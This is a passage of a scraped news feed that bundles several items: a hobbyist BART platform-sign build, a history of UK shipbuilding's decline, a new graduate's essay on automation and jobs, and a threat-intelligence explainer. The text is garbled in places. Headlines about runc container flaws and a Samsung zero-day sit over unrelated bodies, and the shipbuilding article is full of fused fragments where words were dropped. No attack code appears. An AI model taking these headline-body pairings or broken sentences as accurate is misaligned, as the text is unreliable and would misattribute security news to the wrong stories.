to retire the phrase "legendary approach to quality control" and replace it with something more befitting the situation?This is where  readership comes in, particularly those who have been at the sharp, pointy end of Redmond's antics.How would you describe the quality of Microsoft's wares these days, and the amount of testing that has been done before the company's latest emission?Sadly, the word "pisspoor" might confuse the international audience, and naughty words could trip firewall filters.But things seem to have moved beyond "legendary approach to quality control." ®]]></content:encoded></item><item><title>Critical runc Vulnerabilities Put Docker and Kubernetes Container Isolation at Risk</title><link>https://cybersecuritynews.com/runc-tool-vulnerability/</link><author></author><category>security</category><pubDate>Mon, 10 Nov 2025 08:05:30 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

I’m grateful for it, but let’s just say it’s not always the most reliable so it’s nice to see before hand when the train you need is due to arrive. There are plenty of projects out there that show real-time BART arrival information. This one does that too, it’s nothing groundbreaking, but I wanted to build my own version that captures the vintage BART platform sign vibe I associate with commuting between the East Bay and my job in the city.Seeed Studio XIAO ESP32C6SPI Red 20x4 Character OLED Display Module from BuyDisplaySparkFun Logic Level ConverterI wanted to find a display that felt as close as possible to the real thing, though I knew it wouldn’t be an exact match. I was mainly after the right vibe, and the BuyDisplay red OLED character display nailed it. The PCB was a bit taller than the display itself, which affected the final dimensions, but it was a tradeoff I was happy to make. I love an OLED.The only other components I needed on the electronics side were the ESP32-C6 to run the display and fetch the latest BART arrival times, along with a logic level shifter. Both parts are small, so I soldered them onto a piece of perfboard with header pins, allowing the whole assembly to plug directly into the display like a cartridge.The official BART API uses GTFS Realtime, a data specification developed in collaboration with Google. I’d never worked with it before, and expecting the ESP32 to fetch and parse the raw feed on its own felt like a stretch (or at least, too much for me to figure out). So instead, I built a middleware service that handles the heavy lifting: it pulls the data, extracts only what I need, and serves a simplified API tailored for the display the ESP32 calls. All the code is available on my GitHub.Once I had all the pieces together, including some early 3D prints of the housing, I assembled everything to get a feel for the scale and how it works as a finished product. This video shows it all together but before paint. Data is being pulled in live.All that was left to do was some post processing of the 3d prints and paint, along with some little details like screws and stickers of the company that made the real deal platform signs and which platform the sign was for. I used a Brothers label maker for both. 3D files are available to download on Makerworld.I used double-stick tape to mount this under a metal shelf above my monitor. Now I can see upcoming train arrivals at a glance, and the display also shows the time and official BART platform safety messages, like staying behind the yellow line, which really makes it feel like I’m standing on the platform. Sure, I could just look it up online, but having this miniature version of the platform display on my wall is much more fun.]]></content:encoded></item><item><title>Beets: The music geek’s media organizer</title><link>https://beets.io/</link><author>hyperific</author><category>dev</category><pubDate>Mon, 10 Nov 2025 06:29:54 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[The purpose of beets is to get your music collection right once and for all.

By the 1890s, UK shipbuilders were delivering 80% of worldwide shipping tonnage, and though the country only briefly maintained this market-dominating level of output— on the eve of World War I, its share of the market had fallen to 60% — it nonetheless remained one of the world’s largest shipbuilders for the next several decades.Following the end of WWII, UK shipbuilding appeared ascendant. The shipbuilding industries of most other countries had been devastated by the war (or were, like Japan, prevented from building new ships), and in the immediate years after the war the UK built more ship tonnage than the rest of the world combined.But this success was short-lived. The UK ultimately proved unable to respond to competitors who entered the market with new, large shipyards which employed novel methods of shipbuilding developed by the US during WWII. The UK fell from producing 57% of world tonnage in 1947 to just 17% a decade later. By the 1970s their output was below 5% of world total, and by the 1990s it was less than 1%. In 2023, the UK produced no commercial ships at all.Ultimately, UK shipbuilding was undone by the very thing that had made it successful: it developed a production system that heavily leveraged skilled labor, and minimized the need for expensive infrastructure or management overheads. For a time, this system had allowed UK shipbuilders to produce ships more cheaply and efficiently than almost anywhere else. But as the nature of the shipping market, and of ships themselves, changed, the UK proved unable to change its industry in response, and it steadily lost ground to international competitors.Dutch shipbuilding waseroded byandBut as wooden sailing ships gave way to iron and steel steamships over the course of the 19th century, the UK reclaimed its advantage. By the 1850s, the UK was building iron ships more cheaply than wood ships, and while it took decades for iron, steel and steam to displace wood and sail — sail remained a better option than steam for very long voyages until the 1880s — Britain’s access to cheap coal, cheap iron (and later cheap steel), and cheap skilled labor (compared to the US) allowed it to dominate the transformed shipbuilding industry. By 1900, UK shipbuilding productivity was substantially higher than in the US, and even further ahead of other countries. The UK had become the “shipyard of the world” on the back of its inexpensive production.have been described asmost British yardsoften hadwereIn addition to minimizing infrastructure overheads, British shipyards had low management overheads; much of the work was performed by skilled labor organized into “squads,” groups of tradesmen which could organize work without needing much in the way of specific instructions. As a result, British shipyards employed comparatively few supervisors, and did little in the way of production planning.Because shipyard workers had little in the way of job security, the British shipbuilding industry became strongly unionized. Iron shipbuilding was done by a group of 15 different unions — riveters, boilermakers, plumbers, and so on — and there were very strict rules about which unions were allowed to do which tasks. This arrangement had its advantages — unions oversaw much of the training and apprenticeship of new workers, and allowed the work to be done with comparatively little management overhead. But it also had drawbacks: the union’s (rational) lack of trust in the shipbuilders, who they correctly viewed as considering their workers disposable, resulted in fierce opposition to changes in the nature of ship production, and made introducing method improvements fraught.wartime shipbuilding programBut the competitive landscape of the shipbuilding industry was changing. Worldwide shipyard capacity after the war was roughly double what it had been before it. Other countries were eager to give support to their local shipbuilding industries, and foreign shipyards were catching up to British levels of productivity.problem of foreign competitionThe employers reviewed the history of foreign competition and conceded that whilst before the war foreign competition had presented a threat, ‘the margin of difference then was sufficiently limited’ to prevent a successful challenge to our premier position and certainly such a catastrophe as an important British order going abroad’. The margin of difference, however, now favoured continental builders and there was every prospect of more British orders going abroad and fewer foreign orders coming to the UK.What’s more, the postwar boom in shipbuilding had created a huge glut in ships and shipbuilding capacity. In the early 1920s British shipbuilding had a third more capacity than it did before the war, only to be faced with demand less than half of what it was in 1914. By 1933, worldwide seaborne trade was down 6% from 1913, but the tonnage of merchant ship capacity was up by 49%, greatly reducing demand for new ships.British shipbuilding was further hamstrung by the Washington Naval Treaty, which was signed in 1922 and then extended by the London Naval Treaty in 1930. The treaty, signed by the UK, the US, France, Italy and Japan, attempted to prevent a naval arms race by limiting naval vessel construction for each signatory. What had been a robust British program of naval expansion was suddenly halted. Following the treaty, British naval shipbuilding fell by over 90%.The lack of shipbuilding, increased pressure from foreign competition, and the global decline in new ship orders wreaked havoc on the British shipbuilding industry in the 1920s and 30s, to the benefit of its competitors. The UK’s fraction of worldwide ship tonnage produced declined from 60% in 1924 to 50% by the end of the 1920s, to less than 40% by the mid-1930s. Over the same period, Germany, Sweden, and Japan’s combined share rose from 12% to 36%. Numerous British shipbuilding firms ceased operations, and shipbuilding unemployment rose from 5.5% in 1920 to over 40% in 1929. In the first 9 months of 1930, only one in five of British shipbuilders received any orders at all.funded tocease ship productionBut the issues of foreign competition that had increasingly threatened the UK’s dominance prior to WW2 had only retreated temporarily. What’s more, during the war, developments had taken place that would threaten the skilled labor-intensive production model that British shipbuilders relied on. To win the Battle of the Atlantic and overcome destruction to their fleet caused by German U-boats, the US had used welded, prefabricated construction to rapidly build enormous numbers of simple cargo ships: Liberty ships, Victory ships, and T-2 Tankers. In the 1950s, those methods of ship construction were brought to Japan, where they continued to be refined.British shipbuilders could have taken advantage of these methods as well. They had seen firsthand the huge number of Liberty ships American shipyards were producing (the Liberty ship was, after all, originally a British design), and had made use of welded, prefabricated construction themselves to build vessels during wartime. But British shipbuilders perceived adopting these radically different production methods as risky. It would require enormous capital expenditure, and British shipbuilders had only survived the brutal 1930s thanks to their comparatively light overheads and labor-intensive methods. Dramatic changes to production methods would also require changes to the very strict demarcation system of its unionized labor force, which the unions, naturally distrustful of shipyard operators, were sure to resist. And while the US had successfully built thousands of ships very rapidly during the war, it had come at a cost: the US cargo ships, using modern methods, were more expensive to build than similar British ships. Though some British shipbuilders recognized the potential of welding and prefabrication, they weren’t clearly worth reorganizing the entire industry around.noted thatpredicted thatThus, even as the world shipbuilding market boomed in the 1950s, UK shipbuilding output stayed roughly constant. Between 1947 and 1957, UK ship output rose by 18%, while worldwide output comparatively rose by over 300%. Countries like Germany, Sweden, and Japan picked up the slack. The UK lost its position as the world’s biggest shipbuilder by tonnage to Japan in 1956. By the end of the 1950s, Germany and Sweden had passed the UK in ship tonnage built for export and by the end of the 1960s they were outproducing the UK in overall ship tonnage. Between 1950 and 1975, one of the largest shipbuilding booms in history, the UK was the only major shipbuilding country to not increase its output at all.As other countries expanded their output, adopted modern production methods, and built new, efficient shipyards, British shipbuilders found themselves increasingly uncompetitive. Their costs were higher than those of foreign shipbuilders, and their delivery times were longer. Shipbuilding had traditionally been done on a “cost plus” basis, where owners were charged some percentage above costs incurred when building the ship, but owners were increasingly requiring fixed price bidding. British shipbuilders, with their comparative lack of production planning and managerial control, struggled to adapt to the new reality. British shipowners, traditionally the primary customer of British shipyards, were increasingly buying their ships abroad, citing the UK’s high costs and long delivery times.argued thatwas aconcluded thatThe return on capital employed and investment rates were criticised as poor and British costs were felt to be comparatively high in international terms. Restrictive practices were noted, but more worryingly there was a shortage of skilled labour in the industry, which was responsible for the British single-shift system, with consequently expensive overtime, compared with the double-shift system which was normal on the Continent and in Japan.had beenconcluded the industryhad beenThat same year, the head of the UK’s Shipbuilding Advisory Committee staged a high-profile resignation, stating that the excuses of the industry to avoid investigating its problems were “so frustrating that to continue serving the industry as chairman would be fruitless.” In response to the resignation, in 1961, the Advisory Committee released a report on the shipbuilding industry. However, other than arguing that credit facilities (lending to shipowners to make purchasing ships easier) should be expanded, the report gave few strong recommendations.The Shipbuilding Advisory Committee report was followed by another government-commissioned report on why British shipowners were buying from foreign yards; the report concluded that the major reasons were “price; price and delivery date; price and credit facilities; guaranteed delivery dates; and the reluctance of British builders to install foreign-built engines.”As the industry continued to struggle in the 1960s, the reports piled up even higher. A 1962 report on productivity commissioned by the British Ship Research Association noted “the underdeveloped nature of managerial hierarchies in the industry as a serious weakness and recommended a more systematic approach to production control”. A report by the British Ship Exports Association on the Norwegian market (traditionally one of Britain’s strongest ship export markets) noted that “Norwegian customers... have voiced a series of complaints, the principal of which. .. is that in addition to regarding us as unreliable over delivery, many are now saying that we cannot be trusted to honour contracts.” The author of the report noted that:…every reported speech by a British shipbuilder in the Norwegian press usually comprised a list of excuses for poor performance, ranging from official and unofficial stoppages, shortages of labour, failings on the part of subcontractors, modernisation schemes not producing the anticipated results, to recently completed contracts having entailed substantial losses. The impression thus gained by the Norwegians, according to Holt, was of an industry where the shipbuilders had no control or responsibility over problems, and worse, had no ideas as to how to address the problems. Accordingly, the UK’s share of Norwegian shipbuilding, its largest export market, fell from 48% in 1951 to 2.8% in 1965.As reports documenting the UK’s shipbuilding troubles accumulated, things continued to look worse and worse for the shipbuilders. The market for ocean liners, once a major source of demand for British shipbuilders, was being threatened by the rise of commercial air travel. Transatlantic travel by air surpassed transatlantic ocean travel in 1957, and the ascendance of commercial jetliners further eroded the market. By 1969, passengers crossing the Atlantic by plane outnumbered maritime passengers 24 to 1. And the explosion of global trade in the 1950s and 60s was met not just with more ships, but with larger ships (such as Very Large Crude Carriers for transporting oil) which were cheaper to build and operate. The simple Liberty ship built in huge numbers by the US during the war was about 10,000 tons deadweight, but by the end of the 1950s Japan was building ships in excess of 100,000 tons deadweight.Likewise, by the end of the 1960s Japanese shipyards were building drydocks with 400,000 tons capacity. By comparison, British shipyards, which had been built in an era of much smaller ships, had trouble accommodating these huge ships, in part due to lack of space for expansion. (Some space-constrained British yards attempted to get around their space constraints by building large ships in two halves, which were then stitched together in the water.) And as ships got larger, prefabricated construction methods got more advanced, utilizing massive gantry cranes to assemble ships out of huge pre-built blocks. Advances in prefabrication continued to drive down costs in the shipyards that implemented them. Between 1958 and 1964, the labor hours required to build a given amount of tonnage in a Japanese shipyard fell by 60%, and the amount of steel fell by 36%. Over the same period the UK’s share of global shipbuilding fell from 15% to 8%.Throughout this period, major advances in ship technology were increasingly happened outside the UK. A history of UK shipbuilding noted that 13 of 15 major ship innovations introduced between 1800 and 1950 were first widely adopted in Britain. But of 14 major innovations introduced between 1950 and 1980, only three were first widely adopted in Britain.found thathad finally becomepossibly becauseReay Geddeshistory of British shipbuildingchange a lightbulb…a laborer (member of the Transport and General Workers Union) [to] carry the ladder to site, a rigger (member of the Amalgamated Society of Boilermakers, Shipwrights, Blacksmiths and Structural Workers Union) [to] erect it and place it in the proper position, and an electrician (member of the Electrical Trades Union) [to] actually remove the old bulb and screw in the new one. Production was often halted while waiting for a member of the appropriate union to arrive to perform the job reserved by agreement for them. (sunset 96)The Geddes committee further argued that none of these issues could be fixed at the scale contemporary shipbuilders were operating at, and that a prerequisite for rescuing the industry was grouping existing shipbuilders together to give them the scale needed to be internationally competitive. The report recommended consolidation, and for a comparatively small amount of government financing (37.5 million pounds in grants and loans, and another 30 million in credit guarantees) to be awarded over the next four years to shipbuilders that consolidated and met a strict set of performance targets.In 1967, the Shipbuilding Inquiry Act implementing the Geddes Report’s recommendations, was passed, and over the next several years, 27 major British shipbuilders were consolidated into 12 groups (though some of these “groups” were groups of just one). As shipyards consolidated, government financing began to flow: between 1967 and 1972 almost 160 million pounds (much more than had been recommended by the Geddes Report) were provided by the government to various shipbuilders, and the shipping board made recommendations for over a billion pounds worth of bank loan guarantees for British shipowners purchasing in British yards.had achievedbecame ownedperformedBritish pound devaluationSuez canal closingThis review of the U.K. shipbuilding industry is pessimistic about the general background situation, and critical of the industry in many areas. U.K. yards generally are under-capitalized and poorly managed; the industry has a poor reputation amongst its customers, particularly for delivery and labour relations; overseas competition has moved more rapidly to modernize and re-equip its facilities and is now better placed to face the forecast surplus of capacity which will exist for the remainder of the 1970’shad been…it should have thrived during the 1967-73 large tanker boom. Instead, due to the typical British shipbuilding problems of high costs, low productivity, poor labor relations, and late delivery, it lost money even with a full order book.The problem of money-losing contracts became so severe that some British shipbuilders found themselves paying owners to cancel contracts they were unable to build profitably.But even nationalization did nothing to rescue the industry. After peaking in 1975, the worldwide shipbuilding market collapsed in the wake of the 1973 energy crisis. The shipbuilding industries in countries like Japan became desperate for new orders, and recent, subsidized entrants like South Korea, Taiwan and Brazil were hungry as well. In the face of such fierce competition, the new British Shipbuilders company wilted. Despite taking virtually any order that it could get, even at loss-making prices, the UK’s shipbuilding industry continued its inexorable decline. Between 1975 and 1985, the UK’s shipbuilding output declined by nearly 90%, and its share of the world market fell from 3.6% to less than 1%. British Shipbuilders began re-privatization in 1983 with the passage of the British Shipbuilders Act, and over the next several years most of those newly privatized yards would close. In 2024, the UK produced just 0.01% of the commercial ship tonnage built worldwide that year. In 2022 and 2023, the percentage was 0.his bookWhile British shipbuilders could have responded by enthusiastically embracing the new methods, they had learned from a lifetime of doing business in a wildly fluctuating market that investments in expensive new shipbuilding infrastructure or high-overhead production methods were risky. Their strategy of rapidly scaling their labor force depending on day-to-day needs had bred a deep distrust between management and labor, and created a strict demarcation system that was difficult to dislodge. Decades of urban development in port cities had made physical expansion of shipyards difficult. Uncertainty about whether transformation was truly needed, and the certainty of costly disruptions should they try, resulted in British shipbuilders sticking with their existing production methods as the rest of the world passed them by.Moreover, globally the economic pressure to shift shipbuilding towards locations with lower labor costs was immense. Sweden modernized its operations far more effectively than the UK, and was one of the most efficient, capable shipbuilding countries in the world in the post-war era, but this didn’t stop the Swedish shipbuilding industry from being hollowed out in the face of competition from Asian producers. Similarly, Japan’s skill in shipbuilding hasn’t stopped it from losing ground to China in recent years.There’s a telling bit in a book about the nationalized British Shipbuilders company called “Crossing the Bar”. At an international shipbuilders conference in London in 1983, a UK shipbuilder asked a Korean delegate why they were keeping their prices so low. The delegate responded that they weren’t worried about UK or European competition, or even Japanese competition: they were worried about China. Several decades on, Korea is now losing ground in the shipbuilding market to China too. So, it’s not clear if a much more vigorous British shipbuilding industry would have been all that much more successful in resisting its ultimate decline.Nevertheless, the lack of motivation (rational or otherwise) of British shipbuilders to modernize their operations certainly did not help. Perhaps they would have ultimately lost out to low-cost Korean and Japanese builders anyway, but had they shared Japan’s “burning zeal” to make their industry competitive, they might have kept the wind in their sails longer.]]></content:encoded></item><item><title>Work after work: Notes from an unemployed new grad watching the job market break</title><link>https://urlahmed.com/2025/11/05/work-after-work-notes-from-an-unemployed-new-grad-watching-the-job-market-break/</link><author>linkregister</author><category>dev</category><pubDate>Mon, 10 Nov 2025 00:43:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I have been putting off writing this for a month, mostly because I did everything I was supposed to do and it still feels like I have no idea what game I am actually playing.I went to university. I got good grades. I did three internships. I ran a tiny consultancy for a while, building things for people and sending invoices that were actually paid. I studied computer science. I have done the very normal, very legible technical work you put on a CV: I learned the tools I was told to learn. I watched the right talks. I followed the right people. I can point at a neat little row of experiences and say: I played by the rules you told me about.I have been applying around as a new grad, sending out the same careful batch of CVs and cover letters that older friends used a few years ago to land solid jobs. What I meet instead is a job market that people now casually call broken. The phrase “white collar recession” has escaped into the mainstream. Articles talk about a graduate jobpocalypse and the disappearance of entry level roles just as the largest cohorts of students emerge from university. Computer science, which was marketed for years as the safest degree in the room, now shows up in headlines as one of the majors with the highest unemployment. People in my cohort are not confused about this the group chat tone is not a bit of a rough patch but this market is cooked.On the official dashboards unemployment is still low, which is what older people tend to quote back at you. From the ground the thing feels different. The postings are there, the interview loops still exist, recruiters still send polite rejections. It is the density of opportunity that has changed. There are more people stacked against fewer real openings, and the default advice of “just apply to more places” lands differently when you know you are running through the same funnel as thousands of other people who also did everything right.When you talk to older people, including many who are sympathetic, they often reach for familiar explanations first. Rates went up. Funding dried out. The last decade of cheap money was a sugar rush. The current US administration is running a particular mix of trade and industrial policy. These are all real. High interest rates do kill hiring sprees. Entire departments exist today mostly because capital was cheap three years ago. But behind that cycle there is something else, less visible in the graphs and much more visible if you are twenty something and trying to get your first proper job at exactly the moment capital has discovered that software and robots and offshore labour can be stacked together.A decade ago people passed around a famous paper that said roughly half of American jobs were at high risk of computerisation over the following couple of decades. It was quoted so often that it turned into a kind of folk memory; a big, scary claim that sat behind every newspaper headline about robots taking work. The follow up work was much less memorable. When the OECD re-did the exercise at the level of tasks rather than whole occupations, the share of jobs flagged as “high risk” shrank to a much smaller slice, and later work showed that employment in those supposedly fragile occupations still grew, just more slowly than elsewhere. Automation as actually measured looked more like a slow pressure on certain kinds of work and wages than a cliff edge.That slow pressure matters. Industrial robots in the United States have already been associated with sizeable job losses and clear wage falls in the regions where they were deployed. The OECD data shows that occupations with more routine, codifiable tasks have grown less and paid worse than occupations that rely more on social skill or physical presence. This is a story about composition, about how many of the jobs created are in fields people can actually enter and live on. The headline unemployment rate can stay low while a particular cohort feels like they are pushing against a wall that gets a little harder every year.If you sit where I sit, as a new grad with a half decent CV and a browser full of ghosted applications, that gradual statistical story does not quite capture the feeling. What it feels like is that the entry corridor has narrowed, and that the bar for being worth a salary at all is moving faster than people want to admit. It feels like you are competing not just with other humans, which would be fine, but with the entire past of the economy: every dataset, every process flow someone has written down, every recording of someone doing the work you are trying to get paid for.The Amazon story is a useful place to stare at this without drifting into science fiction. Leaked internal planning documents and external analyst notes have sketched out a future in which Amazon replaces a large share of warehouse tasks with robotics over the next decade and saves eye watering sums in the process. The company disputes some of the job loss projections, points to new roles created, and likes to say that robots help humans rather than replace them. It is probably sincere and even correct in some places. It is also true that Amazon has quietly expanded its robot fleet to a huge number of units while overall headcount in the most automated centres has flattened or fallen.What interests me is not just the robots, but the quiet rewrite of the rule that sits under them. For most of the industrial era, you could assume that any large physical operation, like a warehouse, would need a certain number of human bodies to move boxes and drive forklifts. Human labour was a kind of fixed ingredient. You might squeeze wage rates or offshore some tasks, but you did not start your business model by asking whether you could avoid hiring people at all. Amazon and other firms like it are now encouraged by shareholders and banks to ask that question first. Not how do we run this warehouse with people, but how many people can we get away with and where can we put them so that they add marginal value on top of systems that coast on software and steel.Teleoperation makes this even stranger. A surprising amount of so called automation today is really labour that has been routed through a screen. There are Filipino workers sitting in offices in Manila wearing VR headsets, remotely steering shelf stocking robots through Japanese convenience stores. There are people in one country sitting at desks, driving forklifts in another country using multi screen setups and a steering wheel, stepping in only when the semi autonomous software gets confused. Security robots patrol office corridors with a remote human ready to take over through a tablet whenever anything looks off.It feels like immigration without immigrants. The rich country gets the labour it wants at a wage that looks more like Manila than Tokyo, but nobody has to build new housing, merge school systems, negotiate over culture or passports. On the rich side, it can be sold as productivity, which plays well politically. On the worker side, it is another rung in the long ladder that runs from call centres to business process outsourcing to micro task platforms. The worker is still human, still fallible, still earning just enough to keep going, but geographically they are treated more like part of the network than part of the town.There is another twist, which is that these teleoperated jobs rarely stand still. A lot of them exist not just to get the work done, but to collect data so that the work can later be done without the human at all. Humanoid projects make this explicit. Neo, a household robot that went viral this year, spends a lot of its actual working time in an “expert mode” where a remote operator pilots it through chores, opening doors and picking up objects. The company then uses those sessions to train its own control model, using both successes and failures as data. Tesla’s Optimus is being taught in a similar way; workers wear rigs and repeatedly grasp cups or wipe tables so that the resulting recordings can be used as samples for the robot to imitate.This is familiar if you watched what happened with data work for self driving cars and large language models. Scale AI started around 2016 with hordes of people labelling images and LiDAR frames for autonomous vehicle companies. Within a few years those labels fed into perception systems and then into foundation models for driving, and the work that was once scattered across many companies as internal grunt work was mostly concentrated with a handful of providers. Teleoperation feels like the embodied version of that. The immediate job is to keep the warehouse or the road running. The secondary job is to produce training data so that the next generation of robots and models will need fewer of you. Ghost work in the physical world.I am not the person in the VR rig or in the forklift chair. My world is the white collar side of this, the part where the work happens in code editors, notebooks, documents and meetings. The pattern rhymes. Over the past couple of years you can watch entry level roles thin out in tech, finance, consulting and similar fields that used to soak up computer science graduates. Reports talking about a white collar recession and about entry level jobs disappearing just as the largest cohorts of graduates hit the market. Computer science, once the safest bet in the room, now shows up in stories as one of the degrees with the worst employment outcomes, which would have sounded like a joke not long ago.You can see the shape of it in small ways. Entry level job boards that used to be full of junior developer roles now skew toward mid level and senior. Graduate schemes quietly cut their intake and companies push harder on automation and AI tooling instead. Employers tell journalists that they are holding back on junior hiring and prefer to lean on experienced staff plus AI tools, or simply automate parts of the work that would once have gone to juniors so they do not need to open the req at all. The ladder is still there, but it has lost a few rungs, and the remaining rungs sit above a seething pile of people who all did what they were told.There is a tight relationship here with the way humans and software scale. Humans have always had some narrow horizontal scaling. A good operator could, in most cases, cover more than one vehicle if they were in the right geometry. Supervisors can coordinate teams. A single person with good tools can now keep an eye on several semi autonomous robots, or fleets of trucks, or a room full of humanoids, intervening only when something weird happens. Software takes this logic and stretches it until it breaks the category. Once you have a strong model, you can copy it into as many agents as you can afford to run. Read the current run of agent papers and demos and you see systems built from many copies of the same underlying model, set up to argue with each other, negotiate, plan and execute as little societies. In that world the baseline worker is not a person and not even a single bot but a swarm of cloned minds sharing memory.Managers are starting to adjust their habits around that. There are already public memos from large companies where leaders tell their staff that any request for headcount has to come with a justification for why an AI system cannot do the job. Shopify’s chief executive talked this way when he told teams to try AI first before asking for more people. Some firms that used to keep small armies of contractors now advertise themselves as “AI first” and quietly shrink the human pool while their products shift more tasks onto models. It is not that nobody gets hired at all. Certain roles are still snapped up. It is that the default answer has flipped. The question is no longer whether a model can cover the job that was going to exist anyway. The question is whether a human can justify their presence next to a stack of models.This is where I keep coming back to a phrase that has been rattling around my brain for the past month: out of distribution humans.Most work lives in the fat middle of a bell curve. Tasks repeat with small variations. Most graduate schemes are built around that fact. You take reasonably bright people, give them a handbook and a mentor, and let them climb a well mapped gradient. Shared service centres, call centres, warehouses, junior consulting rotations, entry level software roles, even a lot of legal and accounting work, all sit in that comfortable hunk of the curve where yesterday’s data is a very good guide to tomorrow’s tasks.Models feast on that part of the curve. That is what they are trained on: logs, emails, historical cases, recordings of someone else doing the job, code repositories, scanned documents. If your work looks a lot like a large pile of past episodes, it is a short hop from playing them back to imitating them. The central question for future labour markets is not whether you are clever or diligent in some absolute sense. It is whether what you do is ordinary enough for a model to learn or strange enough to fall through the gaps.An out of distribution human, in my head, is someone whose job sits far enough in the tail of that curve that it does not currently compress into training data. Maybe they work with genuinely novel problems. Maybe they operate at small scales or in messy physical situations where we do not yet have enough sensors. Maybe they have taste that is not easily reduced to click logs. They are not safe; nothing is. They are simply late on the automation curve. The system needs them until it can watch them for long enough and in enough detail that it can flatten what they do into data.The obvious problem is that most people, including most conscientious, capable new grads, are not doing anything like that. Most of us are trying to get into the middle of the curve, into the part of the labour market that has historically been considered sensible and respectable. My three internships were not wild experiments. They were exactly the kinds of things you do when you are aiming for a normal job: some engineering, some product, some research. The consultancy I ran was tiny and real, but it lived on predictable work. That was the point I was building a CV that sat neatly in the centre of the distribution, because that was where the jobs were.Now it feels like the centre is being hollowed out. Employers are still very happy to talk about skills and effort, but the quiet question under everything is: is your contribution weird enough that we cannot paste it together from a few agents and a cheaper worker in another country. If the answer is no, then even when you do get hired you have to live with the knowledge that your day job is essentially a labelling job. You are adding examples to the pile that will train your future replacement. Out of distribution humans are the ones who manage to stay just far enough ahead of the pile for long enough to have a career.The political reaction to this has not caught up. The industrial nations of the twentieth century were built around the idea that work was the organising principle of life. Catholic social teaching talked about the dignity of labour. Socialist movements sang about the worker as a hero. Protestant infused capitalism turned productivity into a route to salvation. Even the centrist stripe of postwar politics treated a job as the main vehicle through which adults were meant to find status, income and a place in the world. This hung around through the neoliberal years, even as manufacturing shrank and services expanded. You can hear it every time someone from any mainstream party talks about “hard working families”.The result is that a lot of our institutions still act as if giving everyone a job is the primary goal, long after the underlying economic logic has started to drift. You can see it in the way some regions subsidise employment programmes that barely produce anything useful, or insist that people physically come in to do tasks that could be handled in far leaner ways. You can see it in the zombie jobs that exist mostly so that a local unemployment statistic looks less embarrassing. You can see it in small things like states that keep petrol pump attendants around in an age where self service is trivial, just to keep people on the payroll and maintain a social script about service. These are not vast conspiracies but instead residual behaviour of a world that treated labour as sacred.Unions sit in the middle of this. They have in some cases slowed automation in ways that probably preserved wages and bargaining power for longer than markets would have allowed. Metro lines in Europe run with drivers even though driverless lines exist in the same city and have been proven technically viable. Port workers have fought hard to restrict automated cranes and remote controls, sometimes winning explicit clauses that bar certain kinds of automation for the life of a contract. Strikes that shut down whole systems have been used as leverage to negotiate over the future of jobs that could in principle be done with much less human involvement.There is a strange symmetry here. On one side you have firms quietly routing labour through screens and robots, and repeating that jobs will be fine on aggregate. On the other you have unions and politicians insisting that jobs must be preserved, even when that means attaching people to tasks that are technically obsolete. Neither camp really articulates what it would mean for work itself to shrink as a central organising story. They just fight over where the remaining jobs will be and who will do them.If you want to see how far this can go without the sky falling, you look at places that have already pushed automation hard. The International Federation of Robotics statistic tables are slightly dry, but they tell a simple story. South Korea, Singapore, Japan and Germany have been packing industrial robots into their factories at a remarkable rate for years. China started later, then began installing new units at such a pace that it now accounts for more than half of global industrial robot installations and has overtaken Germany in robot density in manufacturing. At the same time, China’s GDP per capita by purchasing power parity is still maybe a third of that of the United States, and its youth unemployment has lurched upwards, with official figures in recent years hovering in the mid to high teens and unofficial estimates higher.So you have a giant country that has thrown money and policy at automation, packed factories full of robots, tied itself into global supply chains, and still produced a generation of graduates who complain on social media about “rotting” in low paid service jobs or online hustle work. You have very visible memes about lying flat and giving up on the competition game. You have an official narrative about hi tech growth that is not exactly false, but feels distant from the daily experience of a twenty three year old with a degree and no good offers.The gig economy in the United States and Europe is another small window into this. Robotaxis are still barely a rounding error in total miles driven. Waymo carries a trivial share of all rides in the cities where it operates. Yet if you talk to ride hail drivers in San Francisco or Phoenix, you hear anxiety that grows faster than the fleet. Data from driver apps already shows earnings slipping in markets where robotaxis operate even though their absolute presence is small, and banks have issued notes warning that urban ride hail platforms face “AV risk” as robotaxi coverage expands. The job loss story gets there before the job loss itself.This is the pattern that worries me more than the big forecast numbers. The technical line is that automation is a slow, uneven pressure; that jobs appear as well as disappear; that productivity can even raise wages in the long run. The lived line for my cohort is that the good jobs at the centre of the curve are thinning out, that junior entry points are being quietly closed, and that we are being told to somehow mutate into outliers while competing with systems that learn from everything we do.I do not know how many jobs will exist in twenty years, or whether my own work will sit far enough into the tail of the distribution to matter. I will certainly try to become an out of distribution human by doing a lot of different things, and by refusing to live entirely in the centre of the curve but if your entire life plan rests on being a respectable, central case worker, doing a standard job in a standard company, I think you should at least stare straight at how much effort is going into eroding that category. If your politics rest on the idea that everyone will work full time and find dignity there, you should stare at it too. The twentieth century spent a lot of intellectual and moral effort glorifying labour because economies needed people to show up every day. The twenty-first century is starting to build machines and systems that do not need quite as many of us.]]></content:encoded></item><item><title>Zero-Click Samsung Zero-Day (CVE-2025-21042) Delivered LANDFALL Spyware Via Malicious DNG Images</title><link>https://securityonline.info/zero-click-samsung-zero-day-cve-2025-21042-delivered-landfall-spyware-via-malicious-dng-images/</link><author></author><category>security</category><pubDate>Mon, 10 Nov 2025 00:43:08 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Both are essential to a comprehensive cybersecurity strategy.Threat intelligence guides proactive defense, providing context on who might attack, what their motives and attacks are, and which indicators to watch for.Threat hunting finds what defenses miss by continuously investigating systems for anomalies and hidden indicators to catch stealthy attackers that evade automated tools.Recorded Future’s Intelligence Cloud unifies threat intelligence and threat hunting, gathering real-time threat data from across the open web, dark web, and technical sources into a single platform.Clarifying Two Critical Security DisciplinesThreat intelligence and threat hunting are two cornerstone practices in modern cybersecurity, serving different but complementary roles. At the most basic level, threat intelligence is about understanding threats outside the organization, while threat hunting is the active pursuit of threats already within an organization’s network or systems.The two functions work best in tandem, but because they are so closely related, they are often misunderstood or conflated. However, the stakes for getting it right are high—cyber threats are growing more advanced and costly, with the global average cost of a data breach reaching $4.4 million. Organizations that invest in both proactive threat hunting and a well-developed threat intelligence program are better positioned to improve security, decision-making, and incident preparedness. And understanding the distinction between the two helps security leaders leverage the right teams and processes for each.What is Threat Intelligence?Threat intelligence is the practice of gathering and analyzing information about current and emerging threats to help defenders make informed decisions. At its core, threat intelligence is about understanding who is attacking, why 